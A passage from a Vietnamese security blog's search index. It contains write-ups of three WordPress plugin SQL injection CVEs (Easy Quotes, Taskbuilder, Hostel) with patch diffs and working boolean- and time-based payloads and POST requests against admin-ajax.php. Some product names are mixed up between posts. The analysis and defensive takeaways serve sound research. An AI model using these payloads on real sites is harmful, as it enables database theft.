kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, 